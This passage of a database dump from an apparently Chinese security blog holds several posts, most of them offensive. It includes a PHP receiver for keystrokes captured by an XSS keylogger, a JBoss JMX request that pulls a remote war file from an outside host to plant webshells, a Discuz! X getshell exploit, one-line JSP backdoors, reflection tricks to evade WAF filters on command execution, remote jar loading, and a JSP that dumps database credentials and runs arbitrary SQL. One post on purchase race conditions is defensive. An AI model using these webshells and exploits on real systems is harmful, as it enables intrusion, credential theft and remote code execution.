服务端接收</strong></p>\n<p>有了javascript客户端，服务端也不能少。在我自己的xss平台没出来前，我就简单地写了一个脚本：</p>\n<pre class=\"brush: php; gutter: true\">&lt;?php\nif(empty($_GET[&#039;char&#039;])) exit;\n$char = $_GET[&#039;char&#039;];\n@session_start();\nif (!file_exists(&quot;log&quot;)) mkdir(&quot;log&quot;);\n$filename = &quot;log/&quot; . session_id() . &quot;.txt&quot;;\nif (file_exists($filename)) {\n        $f = fopen($filename, &quot;a&quot;);\n        fwrite($f, $char);\n        fclose($f);\n}else{\n        $f = fopen($filename, &quot;a&quot;);\n        fwrite($f, &quot;ip:&quot; . getIP() . &quot;\\n&quot;);\n        fwrite($f, &quot;user-agent:&quot; . getUser() . &quot;\\n&quot;);\n        fwrite($f, &quot;From:&quot; . getRefer() . &quot;\\n&quot;);\n        fwrite($f, &quot;begintime:&quot; . date(&quot;Ymd,g:i a&quot;) . &quot;\\n&quot;);\n        fwrite($f, &quot;data:\\n&quot;);\n        fwrite($f, $char);\n        fclose($f);\n}\nfunction getIP()\n{\n        return getenv(&quot;REMOTE_ADDR&quot;) ? getenv(&quot;REMOTE_ADDR&quot;) : &quot;unknow&quot;;\n}\nfunction getUser()\n{\n        return getenv(&quot;HTTP_USER_AGENT&quot;) ? getenv(&quot;HTTP_USER_AGENT&quot;) : &quot;unknow&quot;;\n}\nfunction getRefer()\n{\n        return getenv(&quot;HTTP_REFERER&quot;) ? getenv(&quot;HTTP_REFERER&quot;) : &quot;unknow&quot;;\n}\n?&gt;</pre>\n<p>我在log目录下，用session id来新建一个文件（记录的信息就简单保存在文件中）。因为每个用户的session不一样，所以尽可能地避免了文件的重复。</p>\n<p>这个文件最开头记录了用户的IP、user-agent、referer，然后之后就是输入的数据。我会首先在log中判断，如果有这个session id对应的文件，说明这个用户被记录过，所以在文件最后追加数据就行。如果没有这个文件就创建，然后记录IP等信息。</p>\n<p>当然这个服务端是有漏洞的，并没有对任何输入进行检查，这个自己完善。</p>\n<p><strong>0x05 简单尝试</strong></p>\n<p>我在某个网站后台挂上了这个js，然后自己登陆试了一下，已经能记录输入的信息了。大家应该看得很清楚，输入完账号后按了TAB键，继续输密码，这种情况很常见。</p>\n<p>如果大家对代码有什么改进的建议，可以和我一起讨论。希望你们能和我一起学到知识。</p>', null, '2013-12-18 15:44:51', '1', '641', null, '1', '2014-04-15 14:32:17'), ('342', '1', '20', 'JBoss Jmx GetShell', '园长', '请求：http://192.168.0.113:8080/jmx-console/HtmlAdaptor?action=invokeOp&amp;name=jboss.system:service=MainDeployer&amp;methodIndex=17&amp;arg0=http://www.ahack.net/iswin.war\n<p>成功后访问：http://192.168.0.113:8080/iswin/index.jsp 菜刀连接（默认包含index.jsp、index.jspx、index.jspf、cmd.jsp三个shell）。</p>\n<p>测试版本：jboss-6.1.0.Final。</p>\n<p><a href=\"http://pan.baidu.com/s/1EKwVm\">iswin.war</a></p>', null, '2013-12-19 01:13:23', '1', '1045', null, '0', '2014-04-15 14:31:16'), ('357', '5', '13', '[网络尖刀]Discuz! X 最新Getshell漏洞Exp(自带插件)', 'Anonymous', '在看之前我们首先要像乌云提交的作者致敬，因为是他那个标题才让我们尖刀团队研究出来的，当然如果有人硬是要说抄袭也可以，我们做我们的，你们说你们的，这是我们一贯的风格。\n<p>下载地址：<a href=\"http://pan.baidu.com/s/1c0d27Wc\">Discuz! X 最新Getshell漏洞EXp(自带插件)</a></p>\n<p>作者：网络尖刀安全团队</p>\n<p>#1 这漏洞出现在一个DZ X系列自带的转换工具里面！</p>\n<p>漏洞路径：utility/convert/data/config.inc.php</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2013/12/1.png\"><img class=\"alignnone size-full wp-image-1105\" alt=\"1\" src=\"http://javaweb.org/wp-content/uploads/2013/12/1.png\" width=\"491\" height=\"275\" /></a></p>\n<p>#2 在开始设置里面可以设置数据的属性，而post的数据直接写到了config.inc.php这个文件里面，无任何过滤检测！</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2013/12/2.png\"><img class=\"alignnone size-full wp-image-1106\" alt=\"2\" src=\"http://javaweb.org/wp-content/uploads/2013/12/2.png\" width=\"489\" height=\"342\" /></a></p>\n<p>#3 然后小伙伴们写一半的shell没用，最后尖刀的某个小伙伴说直接修改表单，然后成功！</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2013/12/3.png\"><img class=\"alignnone size-full wp-image-1107\" alt=\"3\" src=\"http://javaweb.org/wp-content/uploads/2013/12/3.png\" width=\"502\" height=\"226\" /></a></p>\n<p>#4 打开EXP直接修改您需要的网站然后直接点击保存即可。</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2013/12/4.png\"><img class=\"alignnone size-full wp-image-1108\" alt=\"4\" src=\"http://javaweb.org/wp-content/uploads/2013/12/4.png\" width=\"446\" height=\"214\" /></a></p>\n<p>shell连接utility/convert/data/config.inc.php  密码c</p>\n<p>最后说一下漏洞很多人玩了很久，我们发出来如果大家爱说装逼也可以我是觉得法客论坛确实是一个好论坛所以发出来大家共享！</p>\n<p>小菜玩的，大牛勿喷！</p>', null, '2013-12-19 21:34:12', '1', '577', null, '0', '2014-04-15 14:30:22'), ('369', '1', '12', 'String和CharArray互转小工具', '园长', '每次都要转字符太麻烦了，写了个小工具。\n<p>下载地址：<a href=\"http://pan.baidu.com/s/1sj2eAhn\">CharToString_fat.jar</a><span style=\"line-height: 1.5em;\"> </span></p>\n<p>源代码：</p>\n<pre class=\"brush: java; gutter: true\">import java.awt.Toolkit;\npublic class Test extends javax.swing.JFrame {\n	private static final long serialVersionUID = 1L;\n	public Test() {\n        initComponents();\n    }\n    private void initComponents() {\n    	int screenWidth = Toolkit.getDefaultToolkit().getScreenSize().width;\n    	int screenHeight = Toolkit.getDefaultToolkit().getScreenSize().height;\n    	this.setBounds(screenWidth / 2 - 367, screenHeight / 2 - 235, 734, 469);\n    	this.setTitle(&quot;Char to String&quot;);\n        jLabel1 = new javax.swing.JLabel();\n        jTextField1 = new javax.swing.JTextField();\n        jButton1 = new javax.swing.JButton();\n        jComboBox1 = new javax.swing.JComboBox();\n        jScrollPane1 = new javax.swing.JScrollPane();\n        jTextArea1 = new javax.swing.JTextArea();\n        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);\n        jLabel1.setText(&quot;Input:&quot;);\n        jButton1.setText(&quot;转换&quot;);\n        jButton1.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                jButton1ActionPerformed(evt);\n            }\n        });\n        jComboBox1.setModel(new javax.swing.DefaultComboBoxModel(new String[] { &quot;toChar&quot;, &quot;toString&quot; }));\n        jTextArea1.setText(&quot;格式\\ntoChar:abcd\\ntoString:97.98,99&quot;);\n        jTextArea1.setColumns(20);\n        jTextArea1.setRows(5);\n        jScrollPane1.setViewportView(jTextArea1);\n        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());\n        getContentPane().setLayout(layout);\n        layout.setHorizontalGroup(\n            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGroup(layout.createSequentialGroup()\n                .addGap(2, 2, 2)\n                .addComponent(jLabel1)\n                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)\n                .addComponent(jTextField1, javax.swing.GroupLayout.DEFAULT_SIZE, 488, Short.MAX_VALUE)\n                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)\n                .addComponent(jComboBox1, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)\n                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)\n                .addComponent(jButton1)\n                .addContainerGap())\n            .addComponent(jScrollPane1)\n        );\n        layout.setVerticalGroup(\n            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGroup(layout.createSequentialGroup()\n                .addGap(13, 13, 13)\n                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)\n                    .addComponent(jLabel1)\n                    .addComponent(jTextField1, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)\n                    .addComponent(jButton1)\n                    .addComponent(jComboBox1, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))\n                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)\n                .addComponent(jScrollPane1, javax.swing.GroupLayout.DEFAULT_SIZE, 420, Short.MAX_VALUE))\n        );\n        pack();\n    }\n    private void jButton1ActionPerformed(java.awt.event.ActionEvent evt) {\n    	String str = jTextField1.getText();\n    	jTextArea1.setText(&quot;&quot;);\n    	String sb = &quot;&quot;;\n    	if(&quot;toChar&quot;.equals(jComboBox1.getSelectedItem())){\n    		for(char c:str.toCharArray()){\n    			sb+=&quot;char(&quot;+(int)c+&quot;),&quot;;\n    		}\n    		jTextArea1.setText(sb.endsWith(&quot;,&quot;)?sb.substring(0,sb.length()-1):sb);\n    	}else{\n    		String[] s = jTextField1.getText().split(&quot;,&quot;);\n    		for(String b:s){\n    			sb+=(char)Integer.parseInt(b);\n    		}\n    		jTextArea1.setText(sb);\n    	}\n    }                                        \n    public static void main(String args[]) {\n        java.awt.EventQueue.invokeLater(new Runnable() {\n            public void run() {\n                new Test().setVisible(true);\n            }\n        });\n    }\n    // Variables declaration - do not modify                     \n    private javax.swing.JButton jButton1;\n    private javax.swing.JComboBox jComboBox1;\n    private javax.swing.JLabel jLabel1;\n    private javax.swing.JScrollPane jScrollPane1;\n    private javax.swing.JTextArea jTextArea1;\n    private javax.swing.JTextField jTextField1;\n    // End of variables declaration                   \n}</pre>', null, '2013-12-21 16:52:16', '1', '521', null, '0', '2014-04-15 14:21:50'), ('383', '1', '12', '菜刀Access数据库两个小工具', '园长', 'wooyun上的小伙伴[<a href=\"http://zone.wooyun.org/user/YY-2012\">YY-2012</a> ]发了个getpass，先用这小工具干掉密码，然后就可以用access数据库打开工具打开了。\r\n<p>\r\n	下载地址：&nbsp;<a class=\"ke-insertfile\" href=\"/uploads/file/20171107/20171107060311_496.zip\" target=\"_blank\">Access.zip</a>\r\n</p>\r\n<p>\r\n	关于有密码各种语言连接菜刀：http://javaweb.org/?p=78\r\n</p>\r\n<p>\r\n	<a href=\"http://javaweb.org/wp-content/uploads/2013/12/14.jpg\"><img class=\"alignnone size-full wp-image-1100\" src=\"http://javaweb.org/wp-content/uploads/2013/12/14.jpg\" alt=\"1\" width=\"999\" height=\"611\" /></a>\r\n</p>', null, '2013-12-23 14:31:15', '1', '531', null, '0', '2014-10-06 14:20:34'), ('400', '2', '14', '并发请求导致的业务处理安全风险及解决方案', 'blue', '<h2>0x00 背景</h2>\n<p>一段简单的购买程序，看起来没有任何问题。</p>\n<p>剩余余额、商品库存、购买权限等判断面面俱到，从头到脚包装的严严实实。</p>\n<p>但是为何人一多就频频漏点呐？何解？</p>\n<p><h2>0x01 问题分析</h2></p>\n<p>还是以商城购买为例，商城网站是web程序和数据库两部分，业务处理流程：</p>\n<pre class=\"brush: actionscript3; gutter: true\">用户金额是否大于商品价格—&gt;商品库存是否充足—&gt;购买操作:生成订单—&gt;扣除用户金额—&gt;商品库存减1</pre>\n<a href=\"http://javaweb.org/wp-content/uploads/2013/12/13.jpg\"><img class=\"alignnone size-full wp-image-1095\" alt=\"1\" src=\"http://javaweb.org/wp-content/uploads/2013/12/13.jpg\" width=\"695\" height=\"637\" /></a>\n流程的每一部分都是web与数据库打交道，查询或者操作数据库。\n<h3>程序示例(PHP+MySQL)</h3>\n<pre class=\"brush: php; gutter: true\">$goods=$db-&gt;FirstRow(&quot;SELECT * FROM &quot;.Tb(&#039;goods&#039;).&quot; WHERE goods_id=&#039;{$goods_id}&#039;&quot;);\nif(empty($goods)) ShowError(&#039;商品不存在&#039;);\n/* 金额是否充足 */\nif($user-&gt;money&lt;$goods[&#039;price&#039;])  ShowError(&#039;金额不足，请充值&#039;);\n/* 商品库存 */\nif($goods[&#039;num&#039;]==0)  ShowError(&#039;库存不足&#039;);\n/* 购买操作 begin */\n//生成订单\nCreateOrder($goods,$user,time());\n$user-&gt;Update(&#039;money&#039;=&gt;$user-&gt;money-$goods[&#039;price&#039;]); //用户金额减少\n$db-&gt;Execute(&quot;UPDATE &quot;.Tb(&#039;goods&#039;).&quot; SET num=num-1 WHERE goods_id=&#039;{$goods_id}&#039;&quot;);//商品库存-1\nShowSuccess(&#039;购买成功&#039;);\n/* 购买操作 end */</pre>\n<p>正常来看这个业务处理是没有问题的，下面想象下多人同时购买（并发请求，如秒杀活动）的情境可能会引发的问题？</p>\n<p>如果一个用户同时有两次购买请求，一次购买已进行到添加订单但未扣除用户金额，另一次购买在第一步用户金额判断便不准确了。</p>\n<p>当商品库存仅为1时，同时有多个请求，而当前没有一个请求走到商品库存减少位置，多次购买都能成功，而商城却无货可发。</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2013/12/22.jpg\"><img class=\"alignnone size-full wp-image-1096\" alt=\"2\" src=\"http://javaweb.org/wp-content/uploads/2013/12/22.jpg\" width=\"863\" height=\"662\" /></a></p>\n<p>总结来说，当有大量的购买操作同时进行，如果<strong>数据库的处理速度跟不上程序的请求速度</strong>，就会出现判断不准确的问题，造成用户以单个商品的金额购买多个商品、某些用户付款了但得不到商品等，算是一个安全风险。</p>\n<p><h2>0x02 解决方案：</h2></p>\n<p>核心思想：将一次业务处理流程（如购买操作）作为一个最小操作单元，同一时间只能有一个操作。</p>\n<pre class=\"brush: actionscript3; gutter: true\">1.  整个操作加内存锁。如在memcache里，开始购买时设置购买状态为进行中，购买结束后清除购买状态，</pre>\n<pre class=\"brush: actionscript3; gutter: true\">程序开始时即从memcache里判断是否有正在进行的购买操作，如有则退出。\n2.  限制每个用户的购买间隔，如10秒内仅允许购买一次，最好也是放在内存里。\n3.  当然，优化数据库及程序以加快处理速度也是有必要的。</pre>\n<p><strong>解决方案程序示例(PHP+MySQL+Memcached)</strong></p>\n<pre class=\"brush: java; gutter: true\">/**\n * 通过memcache解决并发购买问题\n */\n$goods=$db-&gt;FirstRow(&quot;SELECT * FROM &quot;.Tb(&#039;goods&#039;).&quot; WHERE goods_id=&#039;{$goods_id}&#039;&quot;);\nif(empty($goods)) ShowError(&#039;商品不存在&#039;);\n$mmc=memcache_init();\n$lastBuyTime=$mmc-&gt;get(&#039;lastBuyTime_&#039;.$user-&gt;userId);\nif($lastBuyTime&gt;0 &amp;&amp; $lastBuyTime&gt;time()-10)  ShowError(&#039;10秒内只能进行一次购买&#039;);\n$buying=$mmc-&gt;get(&#039;buying&#039;);\nif($buying==1)  ShowError(&#039;有正在进行的购买，请稍候&#039;);\n/* 金额是否充足 */\nif($user-&gt;money&lt;$goods[&#039;price&#039;])  ShowError(&#039;金额不足，请充值&#039;);\n/* 商品库存 */\nif($goods[&#039;num&#039;]==0)  ShowError(&#039;库存不足&#039;);\n/* 购买操作 begin */\n//生成订单\nCreateOrder($goods,$user,time());\n$user-&gt;Update(&#039;money&#039;=&gt;$user-&gt;money-$goods[&#039;price&#039;]); //用户金额减少\n$db-&gt;Execute(&quot;UPDATE &quot;.Tb(&#039;goods&#039;).&quot; SET num=num-1 WHERE goods_id=&#039;{$goods_id}&#039;&quot;);//商品库存-1\n/* 购买操作 end */\n$mmc-&gt;set(&#039;buying&#039;,0);\n$mmc-&gt;set(&#039;lastBuyTime_&#039;.$user-&gt;userId,time());\nShowSuccess(&#039;购买成功&#039;);</pre>', null, '2013-12-25 12:14:48', '1', '679', null, '0', '2014-04-15 14:18:45'), ('417', '1', '14', 'Jsp一行代码遍历当前目录所有文件', '园长', '有小伙伴在求只有遍历文件功能的后门，很简单：\n<pre class=\"brush: java; gutter: true\">&lt;%=java.util.Arrays.toString(new java.io.File(request.getParameter(&quot;p&quot;)).list())%&gt;</pre>\n<a href=\"http://javaweb.org/wp-content/uploads/2013/12/12.jpg\"><img class=\"alignnone size-full wp-image-1091\" alt=\"1\" src=\"http://javaweb.org/wp-content/uploads/2013/12/12.jpg\" width=\"491\" height=\"84\" /></a>\n如果需要解决中文乱码问题：\n<pre class=\"brush: java; gutter: true\">&lt;%@ page language=&quot;java&quot; pageEncoding=&quot;UTF-8&quot;%&gt;\n&lt;%=java.util.Arrays.toString(new java.io.File(request.getParameter(&quot;p&quot;)).list())%&gt;</pre>\n<p>请求：http://xxx.com/shell.jsp?p=/ 就可以了，参数p是路径。</p>', null, '2013-12-26 18:37:10', '1', '535', null, '0', '2014-04-15 14:17:20'), ('433', '1', '14', 'Java 反射执行系统命令', '园长', '<pre>某些时候为了避免一些关键字或者限制，可以用反射去调用一些敏感的东东。比如某些WAF限制了：Runtime.getRuntime().exec、import java.lang.reflect.*。</pre>\n<pre class=\"brush: java; gutter: true\">package org.javaweb.url;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\npublic class z7y{\n    public static void main(String[] args) throws Exception {\n    	BufferedReader br = new BufferedReader(new InputStreamReader(((Runtime)Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;, new java.lang.Class[]{}).invoke(null, new Object[]{})).exec(&quot;netstat -an&quot;).getInputStream()));\n    	String str = &quot;&quot;;\n    	while((str=br.readLine())!=null){\n    		System.out.println(str);\n    	}\n    }\n}</pre>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2013/12/11.jpg\"><img class=\"alignnone size-full wp-image-1087\" alt=\"1\" src=\"http://javaweb.org/wp-content/uploads/2013/12/11.jpg\" width=\"1076\" height=\"684\" /></a></p>\n<p>Java默认导入了java.lang包，所以可以直接使用 Runtime对象，但是java.lang.reflect包需要导入，如果不想导入可以直接用间接的方式调用。如果连Class.forName也被拦截了可以改成：</p>\n<pre class=\"brush: java; gutter: true\">String.class.getClass().forName(&quot;java.lang.Runtime&quot;)</pre>\n...当然，还可以用：Runtime.class 代替Class.forName(\"java.lang.Runtime\")....如果还被拦截，可以用URLClassLoader试试绕过。\n<pre class=\"brush: java; gutter: true\">&lt;%\n	out.println(new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec(&quot;whoami&quot;).getInputStream())).readLine());\n	out.println(&quot;&lt;hr/&gt;&quot;);\n	Runtime r = (Runtime)Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;, new java.lang.Class[]{}).invoke(null, new Object[]{});\n	out.println(new java.io.BufferedReader(new java.io.InputStreamReader(r.exec(&quot;uname&quot;).getInputStream())).readLine());\n%&gt;</pre>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2013/12/21.jpg\"><img class=\"alignnone size-full wp-image-1088\" alt=\"2\" src=\"http://javaweb.org/wp-content/uploads/2013/12/21.jpg\" width=\"1033\" height=\"260\" /></a></p>\n<p>如果只想执行，不想看结果：</p>\n<pre class=\"brush: java; gutter: true\">&lt;%Runtime.getRuntime().exec(&quot;whoami&quot;);%&gt;</pre>', null, '2013-12-28 14:39:39', '1', '654', null, '0', '2014-04-15 14:16:27'), ('442', '1', '3', 'URLClassLoader load外部jar', '园长', '依旧是一行代码，调用外部jar并执行test方法:\n<pre class=\"brush: java; gutter: true\">package com.javaweb.user.test;\nimport java.net.URL;\nimport java.net.URLClassLoader;\npublic class UrlTest {\n    public static void main(String[] args) {\n        try {\n            Class.forName(&quot;org.javaweb.url.Url&quot;,true,new URLClassLoader(new URL[]{new URL(&quot;http://javaweb.org/jar.jar&quot;)})).getMethod(&quot;test&quot;, new Class[]{}).invoke(null, new Object[]{});\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}</pre>', null, '2013-12-28 15:33:19', '1', '521', null, '0', '2013-12-28 15:35:03'), ('447', '1', '14', 'Java数据源\"Hack\"', '园长', '哦，My God..ApplicationContext.xml找不到明文的数据库连接账号密码！快崩溃了，看过<a title=\"Permanent Link: 攻击JavaWeb应用[1]-JavaEE 基础\" href=\"http://drops.wooyun.org/tips/163\" rel=\"bookmark\">攻击JavaWeb应用[1]-JavaEE 基础</a> 和<a href=\"http://drops.wooyun.org/tips/604\">攻击JavaWeb应用[7]-Server篇[1]</a>也没能找到数据库密码。\n<p>在ApplicationContext看到了dbcp或c3p0的配置，但是那里也没写明文的密码啊？到底要怎么连接数据库？</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2013/12/1.jpg\"><img class=\"alignnone size-full wp-image-1079\" alt=\"1\" src=\"http://javaweb.org/wp-content/uploads/2013/12/1.jpg\" width=\"1255\" height=\"677\" /></a></p>\n<p>上图配置了两种常见的数据源，可以一眼就看到数据源具体连接信息。其实我们只需要知道数据源的id就可以连接数据库了。</p>\n<p>&lt;bean id=\"jwDataSource\"  、&lt;bean id=\"dataSourceGlobal\"  上面两个数据源的id分别是jwDataSource和dataSourceGlobal，现在要做的就是在jsp里面去注入对应的bean获取数据库连接。</p>\n<p>上次我贴了一段通过Tomcat等Server的数据源连接数据库的代码，其实原理都是一样的找到数据源的id即可连接数据库。</p>\n<pre class=\"brush: java; gutter: true\">&lt;%@page import=&quot;com.mchange.v2.c3p0.ComboPooledDataSource&quot;%&gt;\n&lt;%@page import=&quot;javax.sql.DataSource&quot;%&gt;\n&lt;%@page import=&quot;java.sql.ResultSetMetaData&quot;%&gt;\n&lt;%@page import=&quot;java.sql.ResultSet&quot;%&gt;\n&lt;%@page import=&quot;java.sql.Connection&quot;%&gt;\n&lt;%@page import=&quot;org.apache.commons.dbcp.BasicDataSource&quot;%&gt;\n&lt;%@page import=&quot;org.springframework.context.ApplicationContext&quot;%&gt;\n&lt;%@page import=&quot;org.springframework.web.context.support.WebApplicationContextUtils&quot;%&gt;\n&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*&quot; pageEncoding=&quot;UTF-8&quot;%&gt;\n&lt;style&gt;\n	th,td {border:1px solid #C1DAD7;font-size:12px;padding:6px;color: #4f6b72;}\n&lt;/style&gt;\n&lt;%\n	ApplicationContext ctx = WebApplicationContextUtils.getWebApplicationContext(getServletContext());\n	DataSource bds =  (DataSource)ctx.getBean(&quot;jwDataSource&quot;);\n	out.println(&quot;dbcp:&lt;br/&gt;&quot;);\n	//dbcp方式\n	BasicDataSource dbcp =  (BasicDataSource)ctx.getBean(&quot;jwDataSource&quot;);\n	out.println(&quot;URL:&quot;+dbcp.getUrl()+&quot;&lt;br/&gt;UserName:&quot;+dbcp.getUsername()+&quot;&lt;br/&gt;PassWord:&quot;+dbcp.getPassword()+&quot;&lt;br/&gt;&quot;);\n	out.println(&quot;&lt;hr/&gt;c3p0:&lt;br/&gt;&quot;);\n	//c3p0\n	ComboPooledDataSource c3p0 =  (ComboPooledDataSource)ctx.getBean(&quot;dataSourceGlobal&quot;);\n	out.println(&quot;URL:&quot;+c3p0.getJdbcUrl()+&quot;&lt;br/&gt;UserName:&quot;+c3p0.getUser()+&quot;&lt;br/&gt;PassWord:&quot;+c3p0.getPassword()+&quot;&lt;br/&gt;&quot;);\n	out.println(&quot;&lt;hr/&gt;Sql:&lt;font color=&#039;red&#039;&gt;&quot;+request.getParameter(&quot;sql&quot;)+&quot;&lt;/font&gt;&lt;br/&gt;&quot;);\n	out.println(&quot;&lt;hr/&gt;DataSource:&lt;br/&gt;&quot;);\n	Connection c = bds.getConnection();\n	ResultSet rs = c.prepareStatement(request.getParameter(&quot;sql&quot;)).executeQuery();\n	ResultSetMetaData d = rs.getMetaData();\n	out.println(&quot;&lt;table&gt;&lt;tr&gt;&quot;);\n	for (int i = 1; i &lt;= d.getColumnCount(); i++) {\n		out.println(&quot;&lt;th&gt;&quot;+d.getColumnName(i)+&quot;(&quot;+d.getColumnTypeName(i)+&quot;)\\t&quot;+&quot;&lt;/th&gt;&quot;);\n	}\n	out.println(&quot;&lt;tr/&gt;&quot;);\n	while (rs.next()) {\n		out.println(&quot;&lt;tr&gt;&quot;);\n		for (int i = 1; i &lt;= d.getColumnCount(); i++) {\n			out.println(&quot;&lt;td&gt;&quot;+rs.getObject(d.getColumnName(i))+&quot;&lt;/td&gt;&quot;);\n		}\n		out.println(&quot;&lt;tr/&gt;&quot;);\n	}\n%&gt;</pre>\n<p>效果图：</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2013/12/2.jpg\"><img class=\"alignnone size-full wp-image-1081\" alt=\"2\" src=\"http://javaweb.org/wp-content/uploads/2013/12/2.jpg\" width=\"912\" height=\"480\" /></a></p>\n<p>请求：http://localhost:8080/ylog/spring.jsp?sql=select id,account,email,qq,sign from wps_sys_user会输出数据源账号密码、连接数据库的URL。</p>\n<p>现在需要做的就是确定到底是什么类型的数据源？如果是dbcp就删除c3p0对应的部分就行了（需要删除</p>\n<pre class=\"brush: java; gutter: true\">&lt;%@page import=&quot;com.mchange.v2.c3p0.ComboPooledDataSource&quot;%&gt;、\n//c3p0\nComboPooledDataSource c3p0 =  (ComboPooledDataSource)ctx.getBean(&quot;dataSourceGlobal&quot;);\nout.println(&quot;URL:&quot;+c3p0.getJdbcUrl()+&quot;&lt;br/&gt;UserName:&quot;+c3p0.getUser()+&quot;&lt;br/&gt;PassWord:&quot;+c3p0.getPassword()+&quot;&lt;br/&gt;&quot;);</pre>\n<p>不删除会报错的哦，DBCP同理。如果俩都不确定只需要查询数据库就行了，不想知道数据库账号密码。那么可以吧它俩都干掉！）。</p>\n<p>使用Server自带的数据源：</p>\n<pre class=\"brush: java; gutter: true\">&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*&quot; pageEncoding=&quot;UTF-8&quot;%&gt;\n&lt;%@page import=&quot;java.io.File&quot;%&gt;\n&lt;%@page import=&quot;java.io.FileWriter&quot;%&gt;\n&lt;%@page import=&quot;java.io.BufferedWriter&quot;%&gt;\n&lt;%@ page import=&quot;java.sql.*&quot;%&gt;\n&lt;%@ page import=&quot;javax.sql.*&quot;%&gt;\n&lt;%@ page import=&quot;javax.naming.*&quot;%&gt;\n&lt;html&gt;\n&lt;body&gt;\n&lt;style&gt;\n	th,td {border:1px solid #C1DAD7;font-size:12px;padding:6px;color: #4f6b72;}\n&lt;/style&gt;\n&lt;!-- \n使用方法:修改java:comp/env/jdbc/tfms为你自己的数据源名字\n		请求http://xxx.com/xxx.jsp?sql=select xxx  from xxx即可\n --&gt;\n&lt;%\n	Context ctx = new InitialContext();\n	DataSource ds = (DataSource) ctx.lookup(&quot;java:comp/env/jdbc/ylog&quot;);\n	ResultSet rs = ds.getConnection().prepareStatement(request.getParameter(&quot;sql&quot;)).executeQuery();\n	ResultSetMetaData d = rs.getMetaData();\n	out.println(&quot;Sql:&lt;font color=&#039;red&#039;&gt;&quot;+request.getParameter(&quot;sql&quot;)+&quot;&lt;/font&gt;&lt;br/&gt;&quot;);\n	out.println(&quot;&lt;table&gt;&lt;tr&gt;&quot;);\n	for (int i = 1; i &lt;= d.getColumnCount(); i++) {\n		out.println(&quot;&lt;th&gt;&quot;+d.getColumnName(i)+&quot;(&quot;+d.getColumnTypeName(i)+&quot;)\\t&quot;+&quot;&lt;/th&gt;&quot;);\n	}\n	out.println(&quot;&lt;tr/&gt;&quot;);\n	while (rs.next()) {\n		out.println(&quot;&lt;tr&gt;&quot;);\n		for (int i = 1; i &lt;= d.getColumnCount(); i++) {\n			out.println(&quot;&lt;td&gt;&quot;+rs.getObject(d.getColumnName(i))+&quot;&lt;/td&gt;&quot;);\n		}\n		out.println(&quot;&lt;tr/&gt;&quot;);\n	}\n	rs.close();\n%&gt;\n&lt;/body&gt;\n&lt;/html&gt;</pre>\n<p>有的时候并不需要找到这段配置：</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2013/12/3.jpg\"><img class=\"alignnone size-full wp-image-1083\" alt=\"3\" src=\"http://javaweb.org/wp-content/uploads/2013/12/3.jpg\" width=\"1231\" height=\"556\" /></a></p>\n<p>只需要在配置文件里面找到java:comp/env/jdbc/ylog就行了（其他Server同理）：</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2013/12/4.jpg\"><img class=\"alignnone size-full wp-image-1084\" alt=\"4\" src=\"http://javaweb.org/wp-content/uploads/2013/12/4.jpg\" width=\"653\" height=\"220\" /></a></p>\n<p>测试Sql执行成功.</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2013/12/5.jpg\"><img class=\"alignnone size-full wp-image-1085\" alt=\"5\" src=\"http://javaweb.org/wp-content/uploads/2013/12/5.jpg\" width=\"647\" height=\"288\" /></a></p>\n<p>下载地址：<a href=\"http://pan.baidu.com/s/1bnounFp\">jndi-spring.jsp.zip</a></p>', null, '2013-12-29 15:21:20', '1', '559', null, '0', '2014-04-15 14:13:39'), ('473', '5', '12', '[wooyun-zone]Linux自动提权工具', 'Anonymous', '<a href=\"https://github.com/d4rkcat/g0tr00t\" target=\"_blank\">https://github.com/d4rkcat/g0tr00t</a>\n<p>检测自己linux服务器是否存在提权问题。</p>\n<p>g0tr00t.sh 将会下载117个本地提权exp尝试是否能够获取root.</p>\n<p>g0tr00t-self-contained.sh 可以直接解压提权比较方便。</p>\n<p>FROM：http://zone.wooyun.org/content/9637</p>\n<p><a href=\"http://pan.baidu.com/s/1hqmirgK\">g0tr00t-master.zip</a></p>\n<p><a href=\"http://pan.baidu.com/s/1sj2fc5Z\">Linux_Exploit_Suggester-master.zip</a></p>', null, '2014-01-03 12:25:27', '1', '577', null, '0', '2014-03-24 11:33:21'), ('487', '1', '20', 'Java WebServer 自动部署后门', '园长', '在乌云社区发现有人发了一个Jboss的自动部署war的后门<a href=\"http://zone.wooyun.org/content/9737\">求此后门的利用方法</a>。\n<pre class=\"brush: java; gutter: 